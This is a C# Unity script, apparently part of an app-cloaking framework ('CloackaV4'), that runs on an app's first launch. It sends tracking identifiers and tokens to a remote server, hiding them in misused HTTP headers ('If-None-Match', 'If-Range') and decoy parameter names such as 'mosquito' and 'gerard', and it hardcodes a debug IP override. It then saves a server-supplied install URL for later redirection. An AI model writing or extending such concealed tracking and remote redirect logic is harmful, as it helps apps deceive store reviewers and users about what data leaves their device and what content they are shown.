using System;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;

namespace CloackaV4.Scripts.Commands
{
    public class FirstLaunchCommand: BaseCommand, ICommand
    {
        public event Action<ResponseModel> OnResult;
        
        private const string IsFirstLaunchConst = "IsFirstLaunch";
        private const string InstallUrlConst = "InstallUrl";
        
        private UnityUrlLoader _urlLoader;
        private DataCollector _dataCollector;
        
        public static string IsFirstLaunch
        {
            get => PlayerPrefs.GetString(IsFirstLaunchConst, "false");
            private set => PlayerPrefs.SetString(IsFirstLaunchConst, value);
        }

        private static string InstallUrl
        {
            get => PlayerPrefs.GetString(InstallUrlConst, string.Empty);
            set => PlayerPrefs.SetString(InstallUrlConst, value);
        }

        public FirstLaunchCommand(UnityUrlLoader urlLoader, DataCollector dataCollector)
        {
            _urlLoader = urlLoader;
            _dataCollector = dataCollector;
        }
        
        public void DoCommand()
        {
            var headers = new Dictionary<string, string>
            {
                {"Accept", "application/json"},
                {"If-None-Match", _dataCollector.analyticsModel.AdjustId},
                {"If-Range", _dataCollector.analyticsModel.RefCode},
#if UNITY_EDITOR
                {"X-debug-ip", "95.25.223.57"},
#endif
            };
            var parameters = new Dictionary<string, string>
            {
                {"artist", "dzidzio"},
                {"mosquito", _dataCollector.analyticsModel.RefCode},
                {"flower", _dataCollector.analyticsModel.AppToken},
                {"gerard", _dataCollector.analyticsModel.CustomerToken},
            };

            string a = Helper.AttachParameters(_dataCollector.analyticsModel.Url, parameters);

            Subscribe();
            _urlLoader.Load(a, headers);
        }

        protected override void Subscribe()
        {
            _urlLoader.OnSuccess += OnCommandSuccess;
            _urlLoader.OnFailure += OnCommandFailed;
        }
    
        protected override void UnSubscribe()
        {
            _urlLoader.OnSuccess -= OnCommandSuccess;
            _urlLoader.OnFailure -= OnCommandFailed;
        }
        
        protected override void OnCommandFailed(string obj)
        {
            Debug.Log($"In FirstLaunch Failed {obj}");
            UnSubscribe();
            Debug.Log(obj);
            
            IsFirstLaunch = "false";
        }

        protected override void OnCommandSuccess(string obj)
        {
            Debug.Log($"In FirstLaunch Success {obj}");
            UnSubscribe();
            
            var response = JsonUtility.FromJson<ResponseModel>(obj);

            if (response != null && response.status)
            {
                IsFirstLaunch = "true";
                InstallUrl = UnityWebRequest.UnEscapeURL(response.data);
            }
            else
            {
                Debug.Log("status = false");
            }
        }
    }
}